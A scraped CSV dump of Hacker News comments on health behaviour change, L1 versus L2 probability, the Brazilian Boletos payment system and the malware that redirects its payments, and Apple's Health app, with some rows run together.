8378436,comment,8377915,8378333,3,0,chimeracoder,,,"> anything that gets people thinking more about their activity and diet seems like a good thing.<p>This makes intuitive sense; however, in practice, the truth is a bit more complicated.<p>We don&#x27;t really know how to get people to change their behaviour and exercise more, eat less, etc.[0] - this is the holy grail of &quot;lifestyle&quot; diseases such as diabetes or heart attacks. (Disclaimer: my startup is a health-tech company aimed at improving medical outcomes through a number of factors, including getting patients to adapt their behaviour).<p>However, there&#x27;s a lot that we know <i>doesn&#x27;t</i> work. It turns out that simply making people more aware of what they&#x27;re eating not only doesn&#x27;t work, but in fact oftentimes causes people to eat more. There are a few hypotheses explaining this, both of which are supported by evidence (so it&#x27;s likely to be a combination of factors).<p>First, people falsely equate awareness with action, psychologically[1], so making them over-aware of that they are doing makes them likely to think that they are taking more action than they actually are[2].<p>The second is that people don&#x27;t have a good sense of how to process this data, so by (e.g.) placing caloric counts[3] next to food items, if they don&#x27;t also know how many calories they should be consuming in a typical meal[4], they can end up overeating (&#x27;This dessert is &quot;only&quot; 800 calories!).<p>[0] by this, I mean a systematic process that is cost-effective on the population at large, not something that is (a) effective only for a small subset of people, or (b) effective but cost-prohibitive.  There are a lot of strategies that are very effective for people who are already low-risk, and a few strategies that are effective but insanely expensive for people who are high-risk.<p>[1] This is analogous to what happens in politics with &quot;slactivism&quot;.<p>[2] This is probably the origin of the advice that you shouldn&#x27;t tell your friends about new resolutions before you have constructed a plan to enact them - telling others about it gives you a sense of satisfaction even before you&#x27;ve done anything.<p>[3] Not that calories are really the best way to measure diet, but let&#x27;s set that aside<p>[4] Most often, people are familiar with the number &#x27;2,000 daily&#x27;, but that doesn&#x27;t help you determine how that should be allocated throughout the day (dividing up into three equally-sized meals is not ideal), and many people require significantly less than or more than 2,000 calories.",1411858636

8378421,comment,,8377680,4,0,njackson5dW,,,"As other people pointed out, it is probability using the L2 norm versus the standard probability that preserves the L1 norm. This means the following: Standard probability distributions are vectors that sum to 1. I.e. x=[0.5 0.2 0.3] is a probability distribution because each x(i)>=0 and sum x(i)=1. This means that the l1 norm of distribution vectors is always 1.<p>The L2 norm of a vector is the square root of the sum of the entries squared. Hence a distribution would be a vector x(i) such that sum x(i)^2 is one. This allows x(i) to have both negative and even imaginary numbers.<p>This awesome talk by Scott \n<a href=""http://www.scottaaronson.com/blog/?p=1345"" rel=""nofollow"">http://www.scottaaronson.com/blog/?p=1345</a>\nexplains the difference between L1 and L2 probability using the Latke vs Hamentaschen Farsical debate.

Unless your business is to harvest e-mail addresses in which case you&#x27;re 10 years late to the party ;)<p>I try to think of LP&#x27;s as a catalyst instead of a validation. LP results make sure you have a potential userbase to reach out to when you suddenly have your MVP in your hands. It&#x27;s like getting the cohorts ready for battle. Better line them up upfront then scrambling for them when the heat is on. In that light it&#x27;s more a parallel path than a part of the MVP.",1411856903

8378386,comment,8377864,8377864,1,0,tzs,,,"I found the explanation of Boletos a bit confusing. I think I&#x27;ve finally figured it out. Here&#x27;s how I think a transaction works when you pay by Boletos. I&#x27;ll do this for an online merchant, but it works for in-person transactions too.<p>1. When you check out and elect to pay by Boletos, you are given a document to print. (For an in-person transaction at a store, the store would print the document). The document contains information that describes the debt you owe for your purchase. In particular, it has the merchant&#x27;s bank account number, the amount you owe, the due date, and presumably an order number or something that will let the merchant know later which particular sale this document is describing. This document is the Boletos. Although it is typically printed, you only actually need the long number printed at the top or the barcode at the bottom (which encodes that number).<p>2. You have several ways to actually pay the merchant.<p>• You can go to your bank&#x27;s online banking site, and show them the Boletos (perhaps by scanning the bar code if you are using their app, which commonly includes a barcode scanner for this purpose, or by entering the number from the Boletos). Your bank then transfers the money to the merchant along with the necessary information to allow the merchant to match this up with your order.<p>• You can go to an ATM and scan the Boletos. Your bank pays the merchant.<p>• You can go the post office, a lottery agent, or some supermarkets, and pay there. They collect the money from you, and send it to the merchant.<p>Fees go up each day after a Boletos is issued, so there is encouragement to pay a Boletos quickly. If you miss the due date, you can still pay but only at a branch of the merchant&#x27;s bank.<p>It seems like an interesting system--something kind of between cash and checks. If used for buying online, the merchant never has any of your payment information such as a credit card number or debit card number. On the other hand, there are none of the protections that a credit card provides. Once you pay a Boletos, the money is gone. If you want it back, you have to convince the merchant to return it.<p>The attacks mentioned in the article mostly consist of interfering with the printing of Boletos. You go to an online site and order something. The site generates a Boletos for you to print. Malware running in your browser modifies this to substitute the bad guy&#x27;s account, and you then go off and pay the bad guy instead of paying the merchant. The bad guys are getting the malware in by various tricks, including hacking into people&#x27;s DSL modems and changing them to use compromised DNS servers so they can hijack attempted visits to popular sites.<p>Even people who never go online are being hit, because the bad guys have also compromised the POS systems in brick-and-mortar stores, so even those can print misdirected Boletos.",1411856764

Some of these seem like there&#x27;s tie-in (body measurements can be assessed through a Withings scale, sleep can be assessed through a Jawbone UP or similar device, and the &quot;Me&quot; section is mostly static), but does Apple have any plan to get people to track their Molybdenum intake on a regular basis? Or their BAC? Or their body temperature?<p>I&#x27;m not saying they need to, but in the past it has seemed like when Apple provided an affordance, they also had a clear use case. If nothing else, you could fully use the device/service in the way they describe, and that would sufficiently justify its adoption for many. With Health, I&#x27;m not seeing that. I wonder if this will threaten the overall adoption of Health, which in general seems like not a terrible idea - anything that gets people thinking more about their activity and diet seems like a good thing.<p>One could argue that their solution is to leave it to third party devices and integration. Apple doesn&#x27;t need to make a scale to help you track your weight (Withings has already done it, as I&#x27;m sure others have), nor does it want to touch the quagmire that is nutrition by claiming to <i>measure</i> the nutritional value of any food. Let some food-related startup do that dirty work, as long as Apple provides some interface for the measurement to end up in this data silo.<p>This argument seems weaker to me than the argument seemed when Apple first started accepting apps for the iPhone (later iOS). Health currently leaves huge swaths of its UI barren for lack of data, and I&#x27;m not sure that hardware developers can swarm to fill in those gaps the way software developers could with the platform.<p>Maybe I missed the part of their talk where they made it obvious how they envisioned Health (and HealthKit) to be used in a fuller way; if that&#x27;s the case, I&#x27;d appreciate a pointer.",1411855305
